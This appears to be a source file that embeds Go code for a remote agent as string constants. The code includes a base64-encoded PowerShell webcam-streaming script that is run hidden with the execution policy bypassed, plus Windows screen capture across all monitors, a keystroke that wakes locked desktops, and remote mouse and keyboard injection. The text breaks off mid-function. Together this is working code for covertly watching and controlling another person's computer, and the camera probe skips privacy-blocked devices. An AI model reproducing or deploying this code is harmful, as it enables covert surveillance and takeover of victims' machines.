const cameraPsCaptureB64 = "cGFyYW0oW3N0cmluZ10kRGV2aWNlSWQ9JycsIFtpbnRdJEZwcz0xNSwgW2ludF0kV2lkdGg9NjQwKQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTdG9wJwpbV2luZG93cy5NZWRpYS5DYXB0dXJlLk1lZGlhQ2FwdHVyZSxXaW5kb3dzLk1lZGlhLkNhcHR1cmUsQ29udGVudFR5cGU9V2luZG93c1J1bnRpbWVdIHwgT3V0LU51bGwKW1dpbmRvd3MuTWVkaWEuQ2FwdHVyZS5NZWRpYUNhcHR1cmVJbml0aWFsaXphdGlvblNldHRpbmdzLFdpbmRvd3MuTWVkaWEuQ2FwdHVyZSxDb250ZW50VHlwZT1XaW5kb3dzUnVudGltZV0gfCBPdXQtTnVsbApbV2luZG93cy5NZWRpYS5NZWRpYVByb3BlcnRpZXMuSW1hZ2VFbmNvZGluZ1Byb3BlcnRpZXMsV2luZG93cy5NZWRpYS5NZWRpYVByb3BlcnRpZXMsQ29udGVudFR5cGU9V2luZG93c1J1bnRpbWVdIHwgT3V0LU51bGwKW1dpbmRvd3MuU3RvcmFnZS5TdHJlYW1zLkluTWVtb3J5UmFuZG9tQWNjZXNzU3RyZWFtLFdpbmRvd3MuU3RvcmFnZS5TdHJlYW1zLENvbnRlbnRUeXBlPVdpbmRvd3NSdW50aW1lXSB8IE91dC1OdWxsCltXaW5kb3dzLlN0b3JhZ2UuU3RyZWFtcy5EYXRhUmVhZGVyLFdpbmRvd3MuU3RvcmFnZS5TdHJlYW1zLENvbnRlbnRUeXBlPVdpbmRvd3NSdW50aW1lXSB8IE91dC1OdWxsCltXaW5kb3dzLkRldmljZXMuRW51bWVyYXRpb24uRGV2aWNlSW5mb3JtYXRpb24sV2luZG93cy5EZXZpY2VzLkVudW1lcmF0aW9uLENvbnRlbnRUeXBlPVdpbmRvd3NSdW50aW1lXSB8IE91dC1OdWxsCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLlJ1bnRpbWUuV2luZG93c1J1bnRpbWUKJG1ldGhzID0gW1N5c3RlbS5XaW5kb3dzUnVudGltZVN5c3RlbUV4dGVuc2lvbnNdLkdldE1ldGhvZHMoKQokYXNUYXNrQWN0aW9uID0gJG1ldGhzIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtZXEgJ0FzVGFzaycgLWFuZCAkXy5HZXRQYXJhbWV0ZXJzKCkuQ291bnQgLWVxIDEgLWFuZCAkXy5HZXRQYXJhbWV0ZXJzKClbMF0uUGFyYW1ldGVyVHlwZS5OYW1lIC1lcSAnSUFzeW5jQWN0aW9uJyB9IHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQokYXNUYXNrR2VuID0gJG1ldGhzIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtZXEgJ0FzVGFzaycgLWFuZCAkXy5HZXRQYXJhbWV0ZXJzKCkuQ291bnQgLWVxIDEgLWFuZCAkXy5HZXRQYXJhbWV0ZXJzKClbMF0uUGFyYW1ldGVyVHlwZS5OYW1lIC1lcSAoJ0lBc3luY09wZXJhdGlvbicgKyBbY2hhcl05NiArICcxJykgfSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKZnVuY3Rpb24gQXdhaXRBY3Rpb24oJG9wKSB7ICR0ID0gJGFzVGFza0FjdGlvbi5JbnZva2UoJG51bGwsIEAoJG9wKSk7ICR0LldhaXQoKSB8IE91dC1OdWxsIH0KZnVuY3Rpb24gQXdhaXRPcCgkb3AsICRUKSB7ICR0ID0gJGFzVGFza0dlbi5NYWtlR2VuZXJpY01ldGhvZCgkVCkuSW52b2tlKCRudWxsLCBAKCRvcCkpOyAkdC5XYWl0KCkgfCBPdXQtTnVsbDsgcmV0dXJuICR0LlJlc3VsdCB9CgojIEJ1aWxkIHRoZSBjYW5kaWRhdGUgZGV2aWNlIGxpc3Q6IHJlcXVlc3RlZCBkZXZpY2UgZmlyc3QsIHRoZW4gZXZlcnkgb3RoZXIKIyBlbnVtZXJhdGVkIHZpZGVvIGNhcHR1cmUgZGV2aWNlLiBQaG90b0NhcHR1cmVTb3VyY2U6OkF1dG8gY2FuIHNpbGVudGx5IGJpbmQKIyB0byBhIHByaXZhY3ktYmxvY2tlZCBvciBidXN5IGRldmljZSBhbmQgZW1pdCB2YWxpZCBhbGwtYmxhY2sgSlBFR3MsIHNvIHdlCiMgcHJvYmUgZWFjaCBkZXZpY2UgYW5kIHNraXAgb25lcyB3aG9zZSBmaXJzdCBmcmFtZXMgYXJlIGJsYWNrLgokY2FuZGlkYXRlcyA9IEAoKQppZiAoJERldmljZUlkKSB7ICRjYW5kaWRhdGVzICs9ICREZXZpY2VJZCB9CiRlbnVtT3AgPSBbV2luZG93cy5EZXZpY2VzLkVudW1lcmF0aW9uLkRldmljZUluZm9ybWF0aW9uXTo6RmluZEFsbEFzeW5jKFtXaW5kb3dzLkRldmljZXMuRW51bWVyYXRpb24uRGV2aWNlQ2xhc3NdOjpWaWRlb0NhcHR1cmUpCiRkZXZzID0gQXdhaXRPcCAkZW51bU9wIChbV2luZG93cy5EZXZpY2VzLkVudW1lcmF0aW9uLkRldmljZUluZm9ybWF0aW9uQ29sbGVjdGlvbl0pCmZvcmVhY2ggKCRkIGluICRkZXZzKSB7IGlmICgkZC5JZCAtYW5kICgkY2FuZGlkYXRlcyAtbm90Y29udGFpbnMgJGQuSWQpKSB7ICRjYW5kaWRhdGVzICs9ICRkLklkIH0gfQppZiAoJGNhbmRpZGF0ZXMuQ291bnQgLWVxIDApIHsgW0NvbnNvbGVdOjpFcnJvci5Xcml0ZUxpbmUoJ25vY2FtOiBubyB2aWRlbyBjYXB0dXJlIGRldmljZXMgZW51bWVyYXRlZCcpOyBleGl0IDIgfQoKJHN0ZG91dCA9IFtDb25zb2xlXTo6T3BlblN0YW5kYXJkT3V0cHV0KCkKJHBlcmlvZCA9IFtpbnRdKDEwMDAgLyBbTWF0aF06Ok1heCgxLCAkRnBzKSkKCmZ1bmN0aW9uIENhcHR1cmVGcmFtZSgkbWMsICRlbmMpIHsKICAkc3RyZWFtID0gTmV3LU9iamVjdCBXaW5kb3dzLlN0b3JhZ2UuU3RyZWFtcy5Jbk1lbW9yeVJhbmRvbUFjY2Vzc1N0cmVhbQogIEF3YWl0QWN0aW9uICRtYy5DYXB0dXJlUGhvdG9Ub1N0cmVhbUFzeW5jKCRlbmMsICRzdHJlYW0pCiAgJHNpemUgPSBbaW50XSRzdHJlYW0uU2l6ZQogICRyZWFkZXIgPSBOZXctT2JqZWN0IFdpbmRvd3MuU3RvcmFnZS5TdHJlYW1zLkRhdGFSZWFkZXIgJHN0cmVhbS5HZXRJbnB1dFN0cmVhbUF0KDApCiAgQXdhaXRPcCAkcmVhZGVyLkxvYWRBc3luYyhbdWludDMyXSRzaXplKSAoW3VpbnQzMl0pIHwgT3V0LU51bGwKICAkYnVmID0gTmV3LU9iamVjdCBieXRlW10gJHNpemUKICAkcmVhZGVyLlJlYWRCeXRlcygkYnVmKQogICRyZWFkZXIuRGlzcG9zZSgpCiAgJHN0cmVhbS5EaXNwb3NlKCkKICByZXR1cm4gLCRidWYKfQoKZnVuY3Rpb24gVGVzdC1CbGFja0ZyYW1lKCRidWYpIHsKICAjIERlY29kZSB0aGUgSlBFRyBhbmQgY29tcHV0ZSBtZWFuIGx1bWluYW5jZTsgPCA0LzI1NSBtZWFucyBlZmZlY3RpdmVseSBibGFjay4KICB0cnkgewogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZyAtRXJyb3JBY3Rpb24gU3RvcAogICAgJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkYnVmKQogICAgJGltZyA9IFtTeXN0ZW0uRHJhd2luZy5JbWFnZV06OkZyb21TdHJlYW0oJG1zKQogICAgJGJtcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwKCRpbWcsIDMyLCAyNCkKICAgICRzdW0gPSAwLjAKICAgIGZvciAoJHkgPSAwOyAkeSAtbHQgMjQ7ICR5KyspIHsgZm9yICgkeCA9IDA7ICR4IC1sdCAzMjsgJHgrKykgeyAkcCA9ICRibXAuR2V0UGl4ZWwoJHgsICR5KTsgJHN1bSArPSAoJHAuUiArICRwLkcgKyAkcC5CKSAvIDMuMCB9IH0KICAgICRibXAuRGlzcG9zZSgpOyAkaW1nLkRpc3Bvc2UoKTsgJG1zLkRpc3Bvc2UoKQogICAgJG1lYW4gPSAkc3VtIC8gKDMyLjAgKiAyNC4wKQogICAgcmV0dXJuICgkbWVhbiAtbHQgNC4wKQogIH0gY2F0Y2ggewogICAgIyBXaXRob3V0IFN5c3RlbS5EcmF3aW5nIGZhbGwgYmFjayB0byBhIHNpemUgaGV1cmlzdGljOiBhIHJlYWwgNjQweDQ4MAogICAgIyBKUEVHIHNjZW5lIGlzIGFsbW9zdCBuZXZlciB1bmRlciAxNTAwIGJ5dGVzOyBhIGJsYWNrIGZyYW1lIGlzIH43MDAtMTIwMC4KICAgIHJldHVybiAoJGJ1Zi5MZW5ndGggLWx0IDE1MDApCiAgfQp9CgokbWMgPSAkbnVsbAokZW5jID0gJG51bGwKJGNob3NlbiA9ICRudWxsCmZvcmVhY2ggKCRjaWQgaW4gJGNhbmRpZGF0ZXMpIHsKICB0cnkgewogICAgJHNldHRpbmdzID0gTmV3LU9iamVjdCBXaW5kb3dzLk1lZGlhLkNhcHR1cmUuTWVkaWFDYXB0dXJlSW5pdGlhbGl6YXRpb25TZXR0aW5ncwogICAgJHNldHRpbmdzLlN0cmVhbWluZ0NhcHR1cmVNb2RlID0gW1dpbmRvd3MuTWVkaWEuQ2FwdHVyZS5TdHJlYW1pbmdDYXB0dXJlTW9kZV06OlZpZGVvCiAgICAkc2V0dGluZ3MuUGhvdG9DYXB0dXJlU291cmNlID0gW1dpbmRvd3MuTWVkaWEuQ2FwdHVyZS5QaG90b0NhcHR1cmVTb3VyY2VdOjpBdXRvCiAgICAkc2V0dGluZ3MuVmlkZW9EZXZpY2VJZCA9ICRjaWQKICAgICR0cmlhbCA9IE5ldy1PYmplY3QgV2luZG93cy5NZWRpYS5DYXB0dXJlLk1lZGlhQ2FwdHVyZQogICAgQXdhaXRBY3Rpb24gJHRyaWFsLkluaXRpYWxpemVBc3luYygkc2V0dGluZ3MpCiAgICAkdGVuYyA9IFtXaW5kb3dzLk1lZGlhLk1lZGlhUHJvcGVydGllcy5JbWFnZUVuY29kaW5nUHJvcGVydGllc106OkNyZWF0ZUpwZWcoKQogICAgaWYgKCRXaWR0aCAtZ3QgMCkgeyAkdGVuYy5XaWR0aCA9IFt1aW50MzJdJFdpZHRoOyAkdGVuYy5IZWlnaHQgPSBbdWludDMyXShbaW50XSgkV2lkdGggKiAzIC8gNCkpIH0KICAgICMgUHJvYmU6IGNhcHR1cmUgdXAgdG8gMyBmcmFtZXMsIGFjY2VwdCB0aGUgZGV2aWNlIGlmIGFueSBpcyBub24tYmxhY2suCiAgICAkb2sgPSAkZmFsc2UKICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgMzsgJGkrKykgewogICAgICAkcHJvYmUgPSBDYXB0dXJlRnJhbWUgJHRyaWFsICR0ZW5jCiAgICAgIFtDb25zb2xlXTo6RXJyb3IuV3JpdGVMaW5lKCJwcm9iZTogZGV2aWNlPSRjaWQgZnJhbWU9JGkgYnl0ZXM9JCgkcHJvYmUuTGVuZ3RoKSIpCiAgICAgIGlmICgtbm90IChUZXN0LUJsYWNrRnJhbWUgJHByb2JlKSkgeyAkb2sgPSAkdHJ1ZTsgYnJlYWsgfQogICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDI1MAogICAgfQogICAgaWYgKCRvaykgeyAkbWMgPSAkdHJpYWw7ICRlbmMgPSAkdGVuYzsgJGNob3NlbiA9ICRjaWQ7IGJyZWFrIH0KICAgICR0cmlhbC5EaXNwb3NlKCkKICB9IGNhdGNoIHsKICAgIFtDb25zb2xlXTo6RXJyb3IuV3JpdGVMaW5lKCJwcm9iZTogZGV2aWNlPSRjaWQgaW5pdCBmYWlsZWQ6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIikKICB9Cn0KaWYgKC1ub3QgJG1jKSB7IFtDb25zb2xlXTo6RXJyb3IuV3JpdGVMaW5lKCdub2NhbTogZXZlcnkgZGV2aWNlIHByb2R1Y2VkIGJsYWNrIGZyYW1lcyAoY2hlY2sgV2luZG93cyBjYW1lcmEgcHJpdmFjeSBzZXR0aW5ncyknKTsgZXhpdCAzIH0KW0NvbnNvbGVdOjpFcnJvci5Xcml0ZUxpbmUoInByb2JlOiB1c2luZyBkZXZpY2UgJGNob3NlbiIpCgp3aGlsZSAoJHRydWUpIHsKICAkYnVmID0gQ2FwdHVyZUZyYW1lICRtYyAkZW5jCiAgJGxlbiA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbaW50MzJdJGJ1Zi5MZW5ndGgpCiAgJHN0ZG91dC5Xcml0ZSgkbGVuLCAwLCA0KQogICRzdGRvdXQuV3JpdGUoJGJ1ZiwgMCwgJGJ1Zi5MZW5ndGgpCiAgJHN0ZG91dC5GbHVzaCgpCiAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAkcGVyaW9kCn0K"

const cameraGoBody = `
const cameraPsListB64 = "${cameraPsListB64}"
const cameraPsCaptureB64 = "${cameraPsCaptureB64}"

type cameraState struct {
	mu       sync.Mutex
	running  bool
	cancel   context.CancelFunc
	gen      int
	deviceId string
	fps      int
	width    int
}

var camera cameraState

var cameraDeviceIndex = struct {
	sync.Mutex
	m map[string]string
}{m: map[string]string{}}

func cameraDefaults() (string, int, int) {
	return "", 15, 640
}

func writeTempPs(b64 string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", err
	}
	f, err := os.CreateTemp("", "sentcam-*.ps1")
	if err != nil {
		return "", err
	}
	_, werr := f.Write(data)
	cerr := f.Close()
	if werr != nil {
		os.Remove(f.Name())
		return "", werr
	}
	if cerr != nil {
		os.Remove(f.Name())
		return "", cerr
	}
	return f.Name(), nil
}

func resolveDeviceId(nameOrId string) string {
	cameraDeviceIndex.Lock()
	defer cameraDeviceIndex.Unlock()
	if id, ok := cameraDeviceIndex.m[nameOrId]; ok {
		return id
	}
	return nameOrId
}

func cameraList(send chan<- []byte, id string) {
	if runtime.GOOS != "windows" {
		sendResult(send, id, true, map[string]any{"devices": []string{}}, "camera streaming is only supported on Windows in this build")
		return
	}
	script, err := writeTempPs(cameraPsListB64)
	if err != nil {
		sendResult(send, id, false, nil, err.Error())
		return
	}
	defer os.Remove(script)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-STA", "-File", script)
	hideWindow(cmd)
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	if err := cmd.Run(); err != nil {
		sendResult(send, id, false, nil, "camera list failed: "+err.Error()+" "+strings.TrimSpace(errBuf.String()))
		return
	}
	names := []string{}
	ids := map[string]string{}
	for _, line := range strings.Split(out.String(), "\\n") {
		line = strings.TrimRight(strings.TrimSpace(line), "\\r")
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 2)
		if len(parts) != 2 {
			continue
		}
		names = append(names, parts[0])
		ids[parts[0]] = parts[1]
	}
	cameraDeviceIndex.Lock()
	cameraDeviceIndex.m = ids
	cameraDeviceIndex.Unlock()
	sendResult(send, id, true, map[string]any{"devices": names}, "")
}

func cameraStart(send chan<- []byte, id string, p map[string]any) {
	camera.mu.Lock()
	if camera.running {
		camera.mu.Unlock()
		sendResult(send, id, true, map[string]any{"ok": true, "already": true}, "")
		return
	}
	defDev, defFps, defW := cameraDefaults()
	camera.deviceId = resolveDeviceId(getStr(p, "device", defDev))
	camera.fps = clampInt(getNum(p, "fps", defFps), 1, 30)
	camera.width = clampInt(getNum(p, "width", defW), 160, 1920)
	ctx, cancel := context.WithCancel(context.Background())
	camera.cancel = cancel
	camera.gen++
	myGen := camera.gen
	camera.running = true
	camera.mu.Unlock()
	go cameraLoop(send, ctx, myGen)
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func cameraStop(send chan<- []byte, id string) {
	cameraHardStop()
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func cameraHardStop() {
	camera.mu.Lock()
	if camera.running {
		camera.running = false
		if camera.cancel != nil {
			camera.cancel()
		}
	}
	camera.mu.Unlock()
}

func cameraConfig(send chan<- []byte, id string, p map[string]any) {
	camera.mu.Lock()
	if v := getStr(p, "device", ""); v != "" {
		camera.deviceId = resolveDeviceId(v)
	}
	if v := getNum(p, "fps", 0); v > 0 {
		camera.fps = clampInt(v, 1, 30)
	}
	if v := getNum(p, "width", 0); v > 0 {
		camera.width = clampInt(v, 160, 1920)
	}
	restart := camera.running
	camera.mu.Unlock()
	sendResult(send, id, true, map[string]any{"ok": true, "restart": restart}, "")
	if restart {
		cameraHardStop()
		cameraStart(send, id+"-r", map[string]any{})
	}
}

func cameraLoop(send chan<- []byte, ctx context.Context, myGen int) {
	defer func() {
		camera.mu.Lock()
		if camera.gen == myGen {
			camera.running = false
			if camera.cancel != nil {
				camera.cancel()
			}
		}
		camera.mu.Unlock()
	}()
	if runtime.GOOS != "windows" {
		cameraPushError(send, "camera streaming is only supported on Windows in this build")
		return
	}
	script, err := writeTempPs(cameraPsCaptureB64)
	if err != nil {
		cameraPushError(send, "camera init failed: "+err.Error())
		return
	}
	defer os.Remove(script)
	for {
		if ctx.Err() != nil {
			return
		}
		camera.mu.Lock()
		dev := camera.deviceId
		fps := camera.fps
		w := camera.width
		camera.mu.Unlock()
		args := []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-STA", "-File", script,
			"-DeviceId", dev, "-Fps", fmt.Sprintf("%d", fps), "-Width", fmt.Sprintf("%d", w)}
		cmd := exec.CommandContext(ctx, "powershell.exe", args...)
		hideWindow(cmd)
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			cameraPushError(send, err.Error())
			return
		}
		stderr, err := cmd.StderrPipe()
		if err != nil {
			cameraPushError(send, err.Error())
			return
		}
		if err := cmd.Start(); err != nil {
			cameraPushError(send, err.Error())
			return
		}
		go func() {
			sc := bufio.NewScanner(stderr)
			sc.Buffer(make([]byte, 1<<16), 1<<20)
			for sc.Scan() {
				line := strings.TrimSpace(sc.Text())
				if line == "" {
					continue
				}
				cameraPushError(send, line)
			}
		}()
		readCameraFrames(ctx, send, bufio.NewReaderSize(stdout, 1<<20))
		_ = cmd.Wait()
		if ctx.Err() != nil {
			return
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}
}

func readCameraFrames(ctx context.Context, send chan<- []byte, r *bufio.Reader) {
	header := make([]byte, 4)
	for {
		if ctx.Err() != nil {
			return
		}
		if _, err := io.ReadFull(r, header); err != nil {
			return
		}
		size := int(binary.LittleEndian.Uint32(header))
		if size <= 0 || size > 20*1024*1024 {
			return
		}
		frame := make([]byte, size)
		if _, err := io.ReadFull(r, frame); err != nil {
			return
		}
		cameraSendFrame(send, frame)
	}
}

func cameraSendFrame(send chan<- []byte, frame []byte) {
	w, h := jpegDims(frame)
	b64 := base64.StdEncoding.EncodeToString(frame)
	msg, _ := json.Marshal(map[string]any{
		"type": "camera.frame",
		"payload": map[string]any{
			"w":     w,
			"h":     h,
			"jpeg":  b64,
			"ts":    time.Now().UnixMilli(),
			"bytes": len(frame),
		},
	})
	select {
	case send <- msg:
	default:
	}
}

func cameraPushError(send chan<- []byte, msg string) {
	m, _ := json.Marshal(map[string]any{
		"type":    "camera.error",
		"payload": map[string]any{"error": msg, "ts": time.Now().UnixMilli()},
	})
	select {
	case send <- m:
	default:
	}
}

func jpegDims(b []byte) (int, int) {
	i := 0
	for i+9 < len(b) {
		if b[i] != 0xFF {
			i++
			continue
		}
		m := b[i+1]
		if (m >= 0xC0 && m <= 0xC3) || (m >= 0xC5 && m <= 0xC7) ||
			(m >= 0xC9 && m <= 0xCB) || (m >= 0xCD && m <= 0xCF) {
			h := int(b[i+5])<<8 | int(b[i+6])
			w := int(b[i+7])<<8 | int(b[i+8])
			return w, h
		}
		if m == 0xD8 || m == 0xD9 || m == 0x01 || (m >= 0xD0 && m <= 0xD7) {
			i += 2
			continue
		}
		if i+3 >= len(b) {
			return 0, 0
		}
		seg := int(b[i+2])<<8 | int(b[i+3])
		if seg < 2 {
			return 0, 0
		}
		i += 2 + seg
	}
	return 0, 0
}
`

const cameraGo = `package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)
` + cameraGoBody






const screenWindowsGo = `//go:build windows
package main

import (
	"fmt"
	"image"
	"sync"
	"syscall"
	"unsafe"
)

var (
	scUser32  = syscall.NewLazyDLL("user32.dll")
	scGdi32   = syscall.NewLazyDLL("gdi32.dll")
	scShcore  = syscall.NewLazyDLL("shcore.dll")

	procGetDC2          = scUser32.NewProc("GetDC")
	procReleaseDC2      = scUser32.NewProc("ReleaseDC")
	procGetSysMetrics   = scUser32.NewProc("GetSystemMetrics")
	procSendInput2      = scUser32.NewProc("SendInput")
	procSetDpiCtx       = scUser32.NewProc("SetProcessDpiAwarenessContext")
	procSetDpiAware     = scUser32.NewProc("SetProcessDPIAware")
	procSetProcDpiAware = scShcore.NewProc("SetProcessDpiAwareness")

	procCreateCompatDC  = scGdi32.NewProc("CreateCompatibleDC")
	procCreateCompatBmp = scGdi32.NewProc("CreateCompatibleBitmap")
	procSelectObj       = scGdi32.NewProc("SelectObject")
	procBitBlt2         = scGdi32.NewProc("BitBlt")
	procDeleteObj       = scGdi32.NewProc("DeleteObject")
	procDeleteDC2       = scGdi32.NewProc("DeleteDC")
	procGetDIBits2      = scGdi32.NewProc("GetDIBits")
)

// SM_XVIRTUALSCREEN / SM_YVIRTUALSCREEN / SM_CXVIRTUALSCREEN / SM_CYVIRTUALSCREEN
const (
	smXVirtual  = 76
	smYVirtual  = 77
	smCxVirtual = 78
	smCyVirtual = 79
)

var dpiOnce sync.Once

// ensureDPIAware marks the process per-monitor DPI aware so BitBlt from the
// desktop DC returns the full-resolution image on scaled 4K/HiDPI displays
// instead of a blank/black frame. Falls back through older APIs on Win 7/8.
func ensureDPIAware() {
	dpiOnce.Do(func() {
		// Windows 10 1703+: DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = (HANDLE)-4
		// ^uintptr(3) is the two's-complement uintptr form of -4 (a constant
		// conversion like uintptr(int32(-4)) fails to compile).
		if procSetDpiCtx.Find() == nil {
			r, _, _ := procSetDpiCtx.Call(^uintptr(3))
			if r != 0 {
				return
			}
		}
		// Windows 8.1+: PROCESS_PER_MONITOR_DPI_AWARE = 2
		if procSetProcDpiAware.Find() == nil {
			procSetProcDpiAware.Call(2)
			return
		}
		// Windows Vista+
		procSetDpiAware.Call()
	})
}

type bitmapInfoHeader struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

type bitmapInfo struct {
	Header bitmapInfoHeader
	Colors [1]uint32
}

func captureFrame(maxW int) (*image.RGBA, int, int, error) {
	// Must run once before any GetSystemMetrics / GetDC call so Windows
	// reports real pixel dimensions and BitBlt returns real pixels instead
	// of a DPI-scaled blank frame on HiDPI / 4K displays.
	ensureDPIAware()

	// Use the full virtual screen (all monitors). On single-monitor setups
	// this is identical to SM_CXSCREEN/SM_CYSCREEN; on multi-monitor it
	// captures everything instead of returning a blank secondary.
	ox, _, _ := procGetSysMetrics.Call(smXVirtual)
	oy, _, _ := procGetSysMetrics.Call(smYVirtual)
	w, _, _ := procGetSysMetrics.Call(smCxVirtual)
	h, _, _ := procGetSysMetrics.Call(smCyVirtual)
	sw, sh := int(int32(w)), int(int32(h))
	sox, soy := int(int32(ox)), int(int32(oy))
	if sw <= 0 || sh <= 0 {
		// Fallback to the primary monitor.
		pw, _, _ := procGetSysMetrics.Call(0)
		ph, _, _ := procGetSysMetrics.Call(1)
		sw, sh = int(pw), int(ph)
		sox, soy = 0, 0
	}
	if sw <= 0 || sh <= 0 {
		return nil, 0, 0, fmt.Errorf("no screen")
	}
	screenDC, _, _ := procGetDC2.Call(0)
	if screenDC == 0 {
		return nil, 0, 0, fmt.Errorf("GetDC failed")
	}
	defer procReleaseDC2.Call(0, screenDC)
	memDC, _, _ := procCreateCompatDC.Call(screenDC)
	if memDC == 0 {
		return nil, 0, 0, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer procDeleteDC2.Call(memDC)
	bmp, _, _ := procCreateCompatBmp.Call(screenDC, uintptr(sw), uintptr(sh))
	if bmp == 0 {
		return nil, 0, 0, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer procDeleteObj.Call(bmp)
	old, _, _ := procSelectObj.Call(memDC, bmp)
	// SRCCOPY | CAPTUREBLT so layered / DWM-composited windows are included
	// instead of showing as a transparent / black rectangle.
	procBitBlt2.Call(memDC, 0, 0, uintptr(sw), uintptr(sh), screenDC,
		uintptr(sox), uintptr(soy), 0x00CC0020|0x40000000)
	if old != 0 {
		procSelectObj.Call(memDC, old)
	}
	var bi bitmapInfo
	bi.Header.Size = uint32(unsafe.Sizeof(bi.Header))
	bi.Header.Width = int32(sw)
	bi.Header.Height = -int32(sh)
	bi.Header.Planes = 1
	bi.Header.BitCount = 32
	bi.Header.Compression = 0
	buf := make([]byte, sw*sh*4)
	procGetDIBits2.Call(memDC, bmp, 0, uintptr(sh), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&bi)), 0)
	for i := 0; i < len(buf); i += 4 {
		buf[i], buf[i+2] = buf[i+2], buf[i]
		buf[i+3] = 255
	}
	img := &image.RGBA{Pix: buf, Stride: sw * 4, Rect: image.Rect(0, 0, sw, sh)}
	if maxW > 0 && maxW < sw {
		img = scaleRGBA(img, maxW)
	}
	return img, img.Rect.Dx(), img.Rect.Dy(), nil
}

func scaleRGBA(src *image.RGBA, newW int) *image.RGBA {
	oldW := src.Rect.Dx()
	oldH := src.Rect.Dy()
	if newW >= oldW {
		return src
	}
	newH := oldH * newW / oldW
	if newH < 1 {
		newH = 1
	}
	dst := image.NewRGBA(image.Rect(0, 0, newW, newH))
	for y := 0; y < newH; y++ {
		sy := y * oldH / newH
		for x := 0; x < newW; x++ {
			sx := x * oldW / newW
			si := sy*src.Stride + sx*4
			di := y*dst.Stride + x*4
			dst.Pix[di] = src.Pix[si]
			dst.Pix[di+1] = src.Pix[si+1]
			dst.Pix[di+2] = src.Pix[si+2]
			dst.Pix[di+3] = 255
		}
	}
	return dst
}

// isBlackFrame samples ~64 pixels across the RGBA buffer and returns true
// if every sampled pixel is near-black (R,G,B all <= 8). This catches the
// common VM / headless-RDP scenario where BitBlt returns valid-but-blank data.
func isBlackFrame(pix []byte, w, h int) bool {
	total := w * h
	if total <= 0 || len(pix) < total*4 {
		return true
	}
	step := total / 64
	if step < 1 {
		step = 1
	}
	for i := 0; i < total; i += step {
		off := i * 4
		if off+2 >= len(pix) {
			break
		}
		if pix[off] > 8 || pix[off+1] > 8 || pix[off+2] > 8 {
			return false
		}
	}
	return true
}

var (
	procKeybdEvent = scUser32.NewProc("keybd_event")
)

// wakeDesktop sends a no-op keybd_event which can wake a dimmed / locked
// VM desktop so the next BitBlt returns a real frame.
func wakeDesktop() {
	if procKeybdEvent.Find() == nil {
		procKeybdEvent.Call(0, 0, 0, 0)
	}
}

const (
	inpMouse    = 0
	inpKeyboard = 1

	mefMove       = 0x0001
	mefLeftDown   = 0x0002
	mefLeftUp     = 0x0004
	mefRightDown  = 0x0008
	mefRightUp    = 0x0010
	mefMiddleDown = 0x0020
	mefMiddleUp   = 0x0040
	mefWheel      = 0x0800
	mefAbsolute   = 0x8000

	kefKeyUp = 0x0002
)

type mouseInputS struct {
	Dx, Dy      int32
	MouseData   uint32
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type keybdInputS struct {
	WVk         uint16
	WScan       uint16
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type inputS struct {
	Type uint32
	Pad  uint32
	U    [32]byte
}

func doSendMouse(mi mouseInputS) {
	var inp inputS
	inp.Type = inpMouse
	*(*mouseInputS)(unsafe.Pointer(&inp.U[0])) = mi
	procSendInput2.Call(1, uintptr(unsafe.Pointer(&inp)), unsafe.Sizeof(inp))
}

func doSendKey(ki keybdInputS) {
	var inp inputS
	inp.Type = inpKeyboard
	*(*keybdInputS)(unsafe.Pointer(&inp.U[0])) = ki
	procSendInput2.Call(1, uintptr(unsafe.Pointer(&inp)), unsafe.Sizeof(inp))
}

func btnDown(b string) uint32 {
	switch b {
	case "right":
		return mefRightDown
	case "middle":
		return mefMiddleDown
	}
	return mefLeftDown
}

func btnUp(b string) uint32 {
	switch b {
	case "right":
		return mefRightUp
	case "middle":
		return mefMiddleUp
	}
	return mefLeftUp
}

func inputMouseCmd(send chan<- []byte, id string, p map[string]any) {
	op := getStr(p, "op", "move")
	xNorm := getFloat(p, "x", -1)
	yNorm := getFloat(p, "y", -1)
	button := getStr(p, "button", "left")
	delta := getNum(p, "delta", 0)
	var flags uint32
	var dx, dy int32
	if xNorm >= 0 && yNorm >= 0 {
		dx = int32(xNorm * 65535)
